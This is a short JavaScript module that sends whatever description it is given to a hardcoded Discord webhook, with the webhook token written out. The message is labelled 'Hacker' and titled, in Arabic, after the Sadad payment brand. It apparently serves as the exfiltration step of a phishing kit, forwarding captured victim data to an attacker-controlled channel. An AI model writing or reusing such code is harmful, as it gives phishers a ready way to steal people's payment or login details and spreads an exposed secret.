import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1316872800082071603/WluutMRjGlG5Ek7UVJJ6RlwZ1bQbWpI9kMXE6Qh4ECz77xQ9v0-OQO27yPpc-2Y5Q-KL",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
